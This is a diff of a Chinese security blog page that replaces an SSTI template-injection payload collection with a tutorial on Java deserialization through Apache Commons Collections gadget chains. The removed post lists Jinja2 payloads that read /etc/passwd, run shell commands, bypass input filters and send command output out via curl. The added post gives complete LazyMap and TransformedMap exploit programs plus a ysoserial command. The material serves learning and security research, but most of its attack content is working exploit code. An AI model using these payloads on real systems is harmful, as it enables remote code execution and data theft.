@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="SSTI模板注入payload记录, Fortheone">
+    <meta name="keywords" content="java反序列化——Commons Collections, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SSTI模板注入payload记录 | Fortheone</title>
+    <title>java反序列化——Commons Collections | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SSTI模板注入payload记录</h1>
+                    <h1 class="description center-align post-title">java反序列化——Commons Collections</h1>
                 </div>
             </div>
         </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-03
+                    2020-07-24
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    756
+                    2.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    11 分
                 </div>
                 
 
@@ -456,90 +456,292 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/ctfjennie1.jpg" width="80%">
-<a id="more"></a>
-<h3 id="0x00前言">0x00前言</h3>
-<p>模板注入也算比较老的东西了，但是偶尔可能会碰到，所以就在这里记录一些bypass方法和一些特殊的payload。</p>
-<p>基本的魔术方法</p>
-<pre><code>__class__  返回类型所属的对象
-__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
-__base__   返回该对象所继承的基类
-// __base__和__mro__都是用来寻找基类的
+                <p>看了好久的文章才开始分析调试java的cc链，这个链算是java反序列化漏洞里的基础了。昨天分析调试的shiro也是直接使用了cc链。首先先了解一些java的反射机制。</p>
+<h3 id="一、什么是反射：">一、什么是反射：</h3>
+<p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行的时候才动态加载类，并且对于任意一个类，都能够知道这个类的所有属性和方法，调用方法/访问属性，不需要提前在编译期知道运行的对象是谁，他允许运行中的Java程序获取类的信息，并且可以操作类或对象内部属性。程序中对象的类型一般都是在编译期就确定下来的，而当我们的程序在运行时，可能需要动态的加载一些类，这些类因为之前用不到，所以没有加载到jvm，这时，使用Java反射机制可以在运行期动态的创建对象并调用其属性，它是在运行时根据需要才加载。</p>
+<p>我们可以在java加载了类进入jvm之后，获取到这个类的实例，并且可以调用这个类的方法，参数之类的。</p>
+<p>看一个例子</p>
+<pre><code>class User{
+    private String name;
+    private int age;
 
-__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
-__init__  类的初始化方法
-__globals__  对包含函数全局变量的字典的引用
+
+    @Override
+    public String toString(){
+        return &quot;User{&quot; + &quot;name=&quot; +name + &quot;, age=&quot;+age+&quot;}&quot;;
+    }
+
+
+    public String getName() {
+        return name;
+    }
+
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+
+    public int getAge() {
+        return age;
+    }
+
+
+    public void setAge(int age) {
+        this.age = age;
+    }
+}
 </code></pre>
-<h3 id="0x01常见的一些payload">0x01常见的一些payload</h3>
-<p>这里多数都是通过先获取到object对象，然后找到file引用来读取文件。</p>
-<pre><code>''.__class__.__mro__[2]
-{}.__class__.__bases__[0]
-().__class__.__bases__[0]
-[].__class__.__bases__[0]
-request.__class__.__mro__[8]    //(jinja2中存在request对象)
+<p>现在定义了一个类User，这个类有各种的方法和参数。我们将这个类实例化之后，再动态调用它的方法来给它赋值。</p>
+<pre><code>public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+    User user = new User();
+    Class clz = user.getClass();
+    Method method = clz.getMethod(&quot;setName&quot;, String.class);
+    Method method1 = clz.getMethod(&quot;setAge&quot;, int.class);
+    method1.invoke(user,21);
+    method.invoke(user,&quot;fortheone&quot;);
+    System.out.println(user);
+}
 </code></pre>
-<p>上面的语句都可以获得object对象，然后通过object对象列出可调用的引用列表，找到可用的引用。</p>
-<pre><code>object.__subclasses__()[40]('/etc/passwd').read()     //file类读取文件
-object.__subclasses__()[40]('/tmp').write('test')     //file类写文件
+<p>在主方法中实现这些反射调用方法，要抛出以上三个错误，否则会无法执行。<br>
+所以一个反射的流程就是：先通过getClass获取到类实例，再通过getMethod获取到类方法，然后再利用invoke方法传入参数进行调用。但是，在这个例子中所调用的方法都是public属性，而在一些类中可能会存在protected或是provide属性，需要用到setAccessible(true)这种方法来解除私有限定。</p>
+<h3 id="java序列化与反序列化"><strong>java序列化与反序列化</strong></h3>
+<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。<br>
+序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。<br>
+要注意的是，只有实现了serializeable接口的类才可以进行序列化操作。</p>
+<pre><code>import java.io.*;
 
-object..__subclasses__()[59].__init__.func_globals['linecache'].os.system('whoami')     //os类执行命令
 
-object.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('ls').read()      //os类执行命令
+public class test1 {
 
-{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()                                        //os类执行命令              
+
+    public static void main(String[] args){
+        User user = new User(&quot;fortheone&quot;, 21);
+        try {
+            // 创建一个FIleOutputStream
+            FileOutputStream fos = new FileOutputStream(&quot;./user.ser&quot;);
+            // 将这个FIleOutputStream封装到ObjectOutputStream中
+            ObjectOutputStream os = new ObjectOutputStream(fos);
+            // 调用writeObject方法，序列化对象到文件user.ser中
+            os.writeObject(user);
+
+
+            System.out.println(&quot;读取数据：&quot;);
+            //  创建一个FIleInutputStream
+            FileInputStream fis = new FileInputStream(&quot;./user.ser&quot;);
+            // 将FileInputStream封装到ObjectInputStream中
+            ObjectInputStream oi = new ObjectInputStream(fis);
+            // 调用readObject从user.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型
+            User user1 = (User)oi.readObject();
+
+
+            user1.info();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+
+class User implements Serializable{
+    private String name;
+    private int age;
+
+
+    public User(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
+
+
+    public void info(){
+        System.out.println(&quot;Name: &quot;+name+&quot;, Age: &quot;+age);
+    }
+
+
+    // private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException{
+    //     System.out.println(&quot;[*]执行了自定义的readObject函数&quot;);
+    // }
+}
 </code></pre>
-<h3 id="0x02-bypass">0x02 bypass</h3>
-<h4 id="1、过滤">1、过滤[</h4>
-<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()                            //读文件
-
-''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()                //执行命令
+<p>这是一个序列化与反序列化的演示，其中的 FileOutputStream ObjectOutputStream 是java的流处理的转换。首先创建一个文件输出流，然后再使用过滤流来处理，可以提供缓冲写的作用。具体可以参见文章（ <a href="https://www.cnblogs.com/shitouer/archive/2012/12/19/2823641.html%EF%BC%89" target="_blank" rel="noopener">https://www.cnblogs.com/shitouer/archive/2012/12/19/2823641.html）</a></p>
+<p>那么在序列化与反序列化的过程中，会有一个问题，就是在反序列化的时候会自动执行类的readObject方法。如果我们在readObject中有恶意的操作，即可造成攻击。如下图：</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/Image.png" alt></p>
+<h3 id="三、Apache-CommonsCollections-序列化RCE漏洞分析">三、Apache-CommonsCollections 序列化RCE漏洞分析</h3>
+<p>环境准备：首先安装idea，然后安装maven插件，使用maven直接安装 CommonsCollections。在pom.xml中加入</p>
+<pre><code>&lt;dependencies&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+        &lt;version&gt;3.1&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
 </code></pre>
-<h4 id="2、过滤引号">2、过滤引号</h4>
-<pre><code>{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
-//先获取chr()函数，赋值给chr，然后用chr拼接出要读取的文件名
+<p>即可安装。安装好以后记得要把项目jdk版本与本地jdk版本对应。参考文章（ <a href="https://blog.csdn.net/qq_22076345/article/details/82392236%EF%BC%89" target="_blank" rel="noopener">https://blog.csdn.net/qq_22076345/article/details/82392236）</a></p>
+<p>出现了CommonsCollections的包就说明成功了。</p>
+<p>漏洞分析：<br>
+在InvokeTransformer类中有这两个方法</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595572499740.png" alt></p>
+<p>构造方法中可以传入三个参数，方法名，参数类型，参数。然后transform方法接收一个object对象。会对传入的对象进行反射调用方法。但是这样还不能执行命令，因为在java中执行命令的操作是  Runtime.getRuntime().exec(cmd)。而在这里我们一次只能传入一个方法。</p>
+<p>但是很巧的是 ChainedTransformer 这个类中的 transform方法可以循环执行 transform方法。并且将上一次执行的结果作为下一次的参数。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595572640861.png" alt></p>
+<p>这样说可能不是很清楚，举个例子来看看。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595572664828.png" alt></p>
+<p>这里要求在chainedTransformer的transform方法中传入一个Runtime对象。但是这样我们没有利用到反序列化，在实际情况里也不可能给我们这样传参去调用。</p>
+<p>从上面的步骤可以看到，整个链的起点就是 Runtime ,而我们在利用这条链的时候也没有办法通过传参去传入这个Runtime。</p>
+<p>但是恰巧有这么一个类 ConstantTransformer 它的构造方法是直接放回传入的参数，它的transform方法也是直接返回传入的参数。那么也就是说 把Runtime.class 传入 ConstantTransformer 作为 transformers数组的起点，通过第一次transform方法，就可以得到Runtime。后面再利用循环调用transform就可以通过反射命令执行。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595572695543.png" alt></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595572699047.png" alt></p>
+<p>这样就可以通过循环调用transform方法来执行命令。现在漏洞触发的核心已经了解清楚了，接下来就是找触发漏洞的利用链。也就是如何触发chainedTransformer的transform方法呢？</p>
+<p>接下来有两条链，一条受限于jdk版本（jdk1.7可以，8不行）</p>
+<h4 id="LazyMap链">LazyMap链</h4>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595572743855.png" alt></p>
+<p>在lazymap的get方法中执行了transform方法。所以只要将factory赋值为chainedTransformer。可以直接在构造方法里赋值。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595572751056.png" alt></p>
+<p>所以要找到一个类可以触发LazyMap的get方法。<br>
+而在TiedMapEntry类中有一个getValue方法可以执行get方法，且map属性可控。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/Image(17).png" alt></p>
+<p>且TiedMapEntry类中的tostring方法可以触发getValue方法，java的tostring方法与php的__tostring方法一样，在类实例被当作字符串的时候会自动执行。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/Image(18).png" alt><br>
+然后又找到 BadAttributeValueExpException 的readObject方法会触发tostring方法</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/Image(19).png" alt><br>
+所以只要把val属性设置为 TiedMapEntry 即可。最终payload：</p>
+<pre><code>import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
 
 
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd
-//要使用到request对象，在jinja2中可使用
+import javax.management.BadAttributeValueExpException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.Map;
+import java.io.*;
 
-//执行命令
-{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
+
+public class test {
+    public static void main(String[] args) throws Exception{
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        innerMap.put(&quot;value&quot;,&quot;asdf&quot;);
 
 
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&amp;cmd=id
+        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);
+        // 将lazyMap封装到TiedMapEntry中
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;val&quot;);
+        // 通过反射给badAttributeValueExpException的val属性赋值
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+        Field val = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);
+        val.setAccessible(true);
+        val.set(badAttributeValueExpException, tiedMapEntry);
+        // 序列化
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(badAttributeValueExpException);
+        oos.flush();
+        oos.close();
+        // 本地模拟反序列化
+        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        Object obj = (Object) ois.readObject();
+    }
+
+
+    }
 </code></pre>
-<h4 id="3、过滤双下划线">3、过滤双下划线</h4>
-<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
-//也要用到request对象
+<h4 id="TransformedMap利用链">TransformedMap利用链</h4>
+<p>Map类是存储键值对的数据结构。 Apache Commons Collections中实现了TransformedMap ，该类可以在一个元素被添加/删除/或是被修改时(即key或value：集合中的数据存储形式即是一个索引对应一个值，就像身份证与人的关系那样)，会调用transform方法自动进行特定的修饰变换，具体的变换逻辑由Transformer类定义。也就是说，TransformedMap类中的数据发生改变时，可以自动对进行一些特殊的变换，比如在数据被修改时，把它改回来; 或者在数据改变时，进行一些我们提前设定好的操作。</p>
+<p>其中的checkSetValue方法中，valueTransformer属性调用了transform方法。所以只要将valueTransformer属性设置为我们之前的chainedTransformer即可触发漏洞。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595573004690.png" alt></p>
+<p>调用decorate方法可以实例化一个 TransformedMap 类，然后将其属性 keyTransformer和valueTransformer设置为我们想要的值。所以现在就是要再找一个触发checkSetValue方法的类。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595573025859.png" alt></p>
+<p>在AnnotationInvocationHandler类中的readObject 中执行了setValue方法。而 setValue() 函数最终会触发 checkSetValue() 函数：</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595573052901.png" alt></p>
+<p>而memberValues来自于构造方法，所以最终的payload为：</p>
+<pre><code>import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Retention;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Map.Entry;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+
+
+
+public class test {
+    public static void main(String[] args) throws Exception {
+        //1.客户端构建攻击代码
+        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;})
+        };
+        //将transformers数组存入ChaniedTransformer这个继承类
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+
+        //创建Map并绑定transformerChina
+        Map innerMap = new HashMap();
+        innerMap.put(&quot;value&quot;, &quot;value&quot;);
+        //给予map数据转化链
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        //反射机制调用AnnotationInvocationHandler类的构造函数
+        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+        //取消构造函数修饰符限制
+        ctor.setAccessible(true);
+        //获取AnnotationInvocationHandler类实例
+        Object instance = ctor.newInstance(Retention.class, outerMap);
+
+
+        //payload序列化写入文件，模拟网络传输
+        FileOutputStream f = new FileOutputStream(&quot;payload.bin&quot;);
+        ObjectOutputStream fout = new ObjectOutputStream(f);
+        fout.writeObject(instance);
+
+
+        //2.服务端读取文件，反序列化，模拟网络传输
+        FileInputStream fi = new FileInputStream(&quot;payload.bin&quot;);
+        ObjectInputStream fin = new ObjectInputStream(fi);
+        //服务端反序列化
+        fin.readObject();
+    }
+    }
 </code></pre>
-<h4 id="4、过滤大括号">4、过滤大括号</h4>
-<pre><code>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
-//利用curl将结果外带
-```
-
-
-
-#### 5、过滤了class 或者 subclasses
-
-利用 'subcla'+'sses'绕过
-
-其他的字符串过滤了也可以使用这种拼接的方式绕过
-
-
-
-#### 其他的一些payload
-
-```
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )
-
-session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]         //可以获取到object对象，再根据序列号选择file或os类
-
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}{% endif %}{% endfor %}
-
-</code></pre>
-<h3 id="0x03-参考文章">0x03 参考文章</h3>
-<p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/</a></p>
-<p><a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%e6%b7%b1%e5%85%a5ssti-%e4%bb%8enctf2018%e4%b8%a4%e9%81%93flask%e7%9c%8bbypass%e6%96%b0%e5%a7%bf%e5%8a%bf/</a></p>
+<h4 id="利用Ysoserial-生成payload">利用Ysoserial 生成payload</h4>
+<p>下载Ysoserial 然后执行 java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 calc.exe &gt; payload.bin<br>
+然后把payload.bin放入项目中，对其进行反序列化</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595573100311.png" alt></p>
 
             </div>
             <hr>
@@ -565,7 +767,7 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/01/03/ssti/">http://yoursite.com/year/01/03/ssti/</a>
+                    <a href="http://yoursite.com/year/07/24/java反序列化——Commons-Collections/">http://yoursite.com/year/07/24/java反序列化——Commons-Collections/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1031,31 +1233,30 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/03/04/JavaScript/">
+                <a href="/year/07/24/java反序列化——Commons-Collections/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="回炉重造计划——JavaScript学习小结">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="java反序列化——Commons Collections">
                         
-                        <span class="card-title">回炉重造计划——JavaScript学习小结</span>
+                        <span class="card-title">java反序列化——Commons Collections</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            JavaScript中的基础语法就不做记录了，大多数会在后面的漏洞分析中记录。
-0x00 JavaScript继承机制
-在JavaScript中，几乎所有的事物都是对象。
-创造对象的方法：
-var o = {a:1,b:2};       
+                            看了好久的文章才开始分析调试java的cc链，这个链算是java反序列化漏洞里的基础了。昨天分析调试的shiro也是直接使用了cc链。首先先了解一些java的反射机制。
+一、什么是反射：
+反射是Java的特征之一，是一种间接操作目标对象的机
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-04
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1068,6 +1269,7 @@ var o = {a:1,b:2};
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1078,34 +1280,32 @@ var o = {a:1,b:2};
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/12/14/SWPUCTF/">
+                <a href="/year/07/22/学校内网再测试/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="SWPUCTF2019复现">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="学校内网再测试">
                         
-                        <span class="card-title">SWPUCTF2019复现</span>
+                        <span class="card-title">学校内网再测试</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SWPUCTF进行的时候刚好在打省赛，所以没有去做题目，只能赛后来看看题目，学习一点新姿势。
-
-0x00 web1
-web1是一个二次注入的题目，因为其中过滤了or，所以常用的information_schema就不能用了，但是可以用之前上
+                            初探内网
+在向信息中心的老师申请了对学校进行一次内网渗透测试的授权之后，我开始着手对学校内网中在用系统进行了一波信息搜集。其中大部分都使用了新版的未爆出0day的框架组件，这让我一开始的打点过程陷入僵局。但是在我重新翻了一遍学校开放的各种w
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-22
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/渗透测试/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
